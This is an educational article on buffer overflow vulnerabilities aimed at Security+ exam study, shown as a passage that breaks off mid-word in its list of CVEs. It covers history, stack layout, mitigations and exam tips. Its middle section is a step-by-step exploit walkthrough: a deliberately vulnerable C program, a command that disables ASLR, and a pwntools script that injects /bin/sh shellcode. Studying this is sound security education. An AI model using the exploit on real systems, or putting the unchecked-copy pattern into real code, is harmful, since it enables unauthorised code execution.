---
domain: "application-security"
tags: [buffer-overflow, memory-corruption, exploitation, binary-exploitation, vulnerabilities, attack]
---

# Buffer Overflow

A **buffer overflow** is a [[memory corruption]] vulnerability that occurs when a program writes more data into a fixed-length memory region than it was designed to hold, spilling into adjacent memory that may contain other variables, saved registers, function pointers, or return addresses. When adjacent memory controls program flow, an attacker can hijack execution and achieve **arbitrary code execution** with the privileges of the vulnerable process. Buffer overflows are the archetypal [[memory safety]] failure and arise almost exclusively in languages without automatic bounds checking, chiefly [[C]] and [[C++]].

---

## Overview

Buffer overflows have shaped the history of computer security. The **Morris Worm** of November 1988 exploited a stack overflow in the BSD `fingerd` daemon to propagate across the early Internet, infecting roughly 10% of connected hosts. It produced the first conviction under the U.S. Computer Fraud and Abuse Act and demonstrated, for the first time at scale, that a single unchecked copy could bring a global network to its knees. A decade later, Aleph One's 1996 *Phrack* article *"Smashing the Stack for Fun and Profit"* formalized the mechanics of stack smashing and made the technique mainstream knowledge within the security community. That article established the conceptual vocabulary — buffer, stack frame, return address, shellcode — that practitioners still use today.

At their root, buffer overflows exist because C-family languages model memory as a raw, untyped byte array and provide no implicit length attached to a pointer. Library functions such as `strcpy`, `gets`, `sprintf`, `memcpy`, and `scanf("%s", …)` copy data into a destination buffer without knowing the buffer's capacity. The C call stack compounds this by physically interleaving user-controlled data (local variable buffers) with program control data (the saved frame pointer `EBP`/`RBP` and the return address). Writing past the end of a local buffer therefore directly corrupts where the CPU will jump when the function returns — a design that made stack smashing reliable for decades.

Overflows are not confined to the stack. **Heap overflows** corrupt memory allocated via `malloc` or `new`, targeting allocator metadata, adjacent object fields, or C++ virtual-function-table (**vtable**) pointers. **BSS/data-segment overflows** corrupt static or global variables. Closely related bug classes include **integer overflows**, which produce undersized allocations that subsequently overflow; **format-string vulnerabilities**, which abuse `printf` family functions to read or write arbitrary memory; and **use-after-free** bugs, where a freed heap object is later accessed. These classes often chain together — an integer overflow manufactures a too-small buffer, which an overflow then exploits.

Modern toolchains and operating systems have layered significant mitigations: stack canaries, non-executable stacks (**DEP/NX**), **Address Space Layout Randomization** ([[ASLR]]), Control Flow Integrity (CFI), and hardware shadow stacks (Intel CET). These controls have substantially raised the cost of exploitation. However, they have not eliminated the class: MITRE CWE-787 ("Out-of-bounds Write") has ranked #1 or #2 on the CWE Top 25 every year since 2021. Mitigations have pushed attackers toward more sophisticated bypass techniques — particularly **Return-Oriented Programming** ([[ROP]]), info-leak chains to de-randomize ASLR, and heap grooming to position objects predictably before triggering an overflow.

Worms built on a single buffer overflow have repeatedly caused global-scale damage. **Code Red** (2001) exploited an IIS `.ida` ISAPI buffer overflow. **SQL Slammer** (2003) fit an entire exploit into a single 376-byte UDP packet targeting MS SQL Server on port 1434. **Blaster** (2003) attacked the DCOM RPC service. Most significantly, **EternalBlue** (CVE-2017-0144) — a buffer overflow in Windows SMBv1 leaked from the NSA — was weaponized by both **WannaCry** and **NotPetya**, causing an estimated $10 billion or more in global damages. The Microsoft Security Response Center has stated publicly that approximately 70% of Microsoft's yearly CVEs are memory-safety issues, a statistic that has driven industry-wide interest in memory-safe languages like [[Rust]].

---

## How It Works

### Stack Frame Anatomy

When a function is called in x86/x64, the `call` instruction pushes the **return address** onto the stack, and the function prologue pushes the saved base pointer then subtracts from the stack pointer to allocate space for local variables. Stack memory grows toward *lower* addresses on x86, while a buffer write using sequential `strcpy`-style copy grows toward *higher* addresses — directly toward the saved metadata. A typical vulnerable stack frame looks like this:

```
High addresses
┌──────────────────────┐
│  function arguments  │
├──────────────────────┤
│  return address      │  ← attacker's primary target
├──────────────────────┤
│  saved EBP / RBP     │
├──────────────────────┤
│  local buffer[64]    │  ← overflow starts here
└──────────────────────┘
Low addresses
```

### The Vulnerable Code

Consider this minimal C program:

```c
#include <stdio.h>
#include <string.h>

void vuln(char *input) {
    char buf[64];
    strcpy(buf, input);   // copies with no length check
    printf("Got: %s\n", buf);
}

int main(int argc, char **argv) {
    vuln(argv[1]);
    return 0;
}
```

`strcpy` writes bytes from `input` into `buf` until it hits a null byte. If `input` is 200 characters, 136 bytes overflow past `buf`, stomping the saved `EBP` and then the return address.

### Compilation for Study

Compile with all mitigations disabled for learning purposes on an isolated VM only:

```bash
gcc -g -fno-stack-protector -z execstack -no-pie \
    -o vuln vuln.c

# Disable ASLR for this session:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Exploitation Workflow

**Step 1 — Confirm the overflow.** Supply a long input and observe the crash:

```bash
./vuln $(python3 -c 'print("A"*200)')
# Segmentation fault (core dumped)
# RIP = 0x4141414141414141 — "AAAAAAAA" landed in the instruction pointer
```

**Step 2 — Find the exact offset.** A cyclic (De Bruijn) pattern allows precise measurement:

```bash
msf-pattern_create -l 200 > pattern.txt
gdb -q ./vuln
(gdb) run $(cat pattern.txt)
# Note the value in $rip on crash, e.g. 0x6161616c61616161
msf-pattern_offset -l 200 -q 0x6161616c61616161
# [*] Exact match at offset 72
```

The return address begins 72 bytes into the payload — 64 bytes of buffer plus 8 bytes of saved `RBP` on x86-64.

**Step 3 — Build the payload.** On a no-NX, no-ASLR binary the classic payload structure is:

```
[NOP sled — n bytes] [shellcode — ~23 bytes] [padding] [return addr pointing into NOP sled]
```

Using pwntools:

```python
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

elf      = ELF('./vuln')
buf_addr = 0x7fffffffe390   # obtained from gdb: info frame / x/20x $rsp

shellcode = asm(shellcraft.sh())   # 48 bytes of x86-64 execve(/bin/sh)
nop_sled  = b'\x90' * 32

payload  = nop_sled + shellcode
payload  = payload.ljust(72, b'A')   # pad to saved RIP offset
payload += p64(buf_addr)             # overwrite return address

io = process(['./vuln', payload])
io.interactive()
# $ id
# uid=1000(user) gid=1000(user) groups=1000(user)
```

**Step 4 — Observe mitigations.** Recompile with `-fstack-protector-strong` to see the canary trigger:

```bash
gcc -fstack-protector-strong -o vuln_safe vuln.c
./vuln_safe $(python3 -c 'print("A"*200)')
# *** stack smashing detected ***: terminated
# Aborted (core dumped)
```

Re-enable ASLR (`echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`) and the hardcoded `buf_addr` no longer works — each run places the stack at a different location.

### Bypassing Modern Mitigations with ROP

When NX is active, injected shellcode on the stack cannot execute. **Return-Oriented Programming** repurposes executable code already in the binary or `libc`. Chains of short instruction sequences ("gadgets") ending in `ret` are strung together so each gadget pops a value and returns to the next:

```bash
# Enumerate gadgets in the binary:
ROPgadget --binary ./vuln --rop
# Or with ropper:
ropper --file ./vuln --search "pop rdi; ret"
```

A typical `execve("/bin/sh")` ROP chain on x86-64 sets `rdi` → address of `/bin/sh` string, `rsi` → 0, `rdx` → 0, then calls `execve` via its PLT/GOT entry — no new code injected, every byte was already present in `libc`.

---

## Key Concepts

- **Stack-based buffer overflow** — Overflow of a buffer declared as a local variable inside a stack frame; classic exploitation overwrites the saved return address to redirect `RIP`/`EIP` to attacker-controlled code.
- **Heap-based buffer overflow** — Overflow in dynamically allocated memory (`malloc`/`new`); exploited by corrupting glibc `tcache`/`fastbin` linked-list metadata, adjacent objects, or C++ vtable pointers, ultimately producing an arbitrary write primitive.
- **Shellcode** — Position-independent machine code injected through the overflow payload, historically designed to call `execve("/bin/sh", 0, 0)` and spawn an interactive shell; must avoid bytes that the vulnerable copy function treats as delimiters (e.g., null bytes for `strcpy`, whitespace for `scanf`).
- **NOP sled** — A long prefix of no-operation instructions (`0x90` on x86) prepended to shellcode; increases the landing zone so that an imprecise return address guess still slides into the payload rather than crashing into garbage instructions.
- **Stack canary** — A compiler-inserted random word (`-fstack-protector`, `-fstack-protector-strong`) placed between local variables and the saved return address, verified on function exit; a corrupted canary triggers `__stack_chk_fail` and terminates the program. Can be bypassed if the canary value is leaked via a separate read vulnerability.
- **ASLR (Address Space Layout Randomization)** — OS feature that randomizes the base load address of the stack, heap, and shared libraries on each execution, preventing attackers from hardcoding target addresses; bypassed by memory-disclosure (info-leak) vulnerabilities that reveal addresses at runtime.
- **DEP / NX (Data Execution Prevention / No-eXecute)** — CPU/OS feature that marks data pages (stack, heap) non-executable so injected shellcode cannot run; enabled by the CPU's NX bit in the page-table entry and enforced by the OS; drove the development of ROP as a bypass technique.
- **Return-Oriented Programming (ROP)** — Exploit technique that chains short `ret`-terminated instruction sequences ("gadgets") already present in executable pages, allowing arbitrary computation without injecting a single new byte of code; defeats DEP/NX entirely.
- **CWE-787 / CWE-120 / CWE-121 / CWE-122** — MITRE CWE identifiers for, respectively: Out-of-bounds Write (generic); Classic Buffer Copy Without Checking Size of Input; Stack-based Buffer Overflow; Heap-based Buffer Overflow. All four appear frequently in CVE descriptions and NVD scoring.
- **Memory-safe languages** — Languages such as [[Rust]], Go, Java, and C# that enforce bounds checking at the compiler or runtime level, eliminating entire classes of buffer overflow by construction; increasingly adopted for security-critical infrastructure.

---

## Exam Relevance

Buffer overflow is explicitly tested on **Security+ SY0-701** under Domain 2 — Threats, Vulnerabilities, and Mitigations, particularly objectives **2.3** (types of application attacks) and **2.5** (mitigation strategies). Key exam points:

**Identification questions.** Expect a scenario such as: *"An application crashes when receiving an input string of 5,000 characters, and the attacker subsequently gains a command shell."* The answer is always **buffer overflow** — not DoS, not injection. The hallmarks are oversized input + memory crash + code execution.

**Classification.** CompTIA categorizes buffer overflow as an **application/memory attack**, not a network attack. The network is merely the delivery mechanism. Contrast with [[SQL injection]] (targets a database interpreter) and [[cross-site scripting]] (targets browser DOM execution context).

**Mitigations by name and function.** You must know:

| Control | What it does |
|---|---|
| Input validation | Prevents oversized data from reaching the buffer (root-cause fix) |
| ASLR | Randomizes memory layout so target addresses are unknown |
| DEP / NX | Prevents execution of data-page shellcode |
| Stack canaries | Detects stack corruption before the function returns |
| Patching | Corrects the vulnerable code in deployed software |

**Common gotchas:**
- Security+ lists **input validation** as the best *preventive* control because it addresses root cause. **Patching** is the best *operational* (post-disclosure) control.
- Buffer overflows primarily threaten **C/C++ compiled code**. Managed-runtime languages (Java, Python, C#) are largely immune unless via bugs in their native runtimes — a nuance that sometimes appears in answer distractors.
- Do not confuse **integer overflow** (arithmetic wraparound) with buffer overflow; integer overflows frequently *cause* buffer overflows by producing undersized allocation sizes, but they are distinct vulnerability types.
- **Heap overflows** and **stack overflows** are both subtypes of buffer overflow; expect questions asking you to differentiate based on memory region.

---

## Security Implications

Buffer overflows represent one of the most severe vulnerability classes because exploitation typically delivers **remote code execution** at the privilege level of the vulnerable process — often `SYSTEM`/`root` on network-facing services. Major real-world incidents include:

**CVE-2017-0144 — EternalBlue.** A buffer overflow in the Windows SMBv1 `srv.sys` driver, exploitable without authentication over TCP port 445. Leaked by the Shadow Brokers group from NSA tooling in April 2017 and weaponized within weeks by the [[WannaCry]] ransomworm and the [[NotPetya]] destructive wiper. Estimated global financial damage exceeds $10 billion. The exploit operates by triggering a type confusion leading to an out-of-bounds write in the SMB transaction handler and then leveraging a pool-spray technique to achieve code execution in the kernel.

**CVE-2019-0708 — BlueKeep.** A pre-authentication heap overflow in the Windows Remote Desktop Protocol (RDP) stack, exploitable over TCP port 3389, affecting Windows 7, Server 2008, Server 2008 R2, Windows XP, and Server 2003. Rated CVSSv3 9.8 and classified as wormable by Microsoft. A full Metasploit module was publicly released in late 2019.

**CVE-2003-0352 — DCOM RPC overflow.** Explo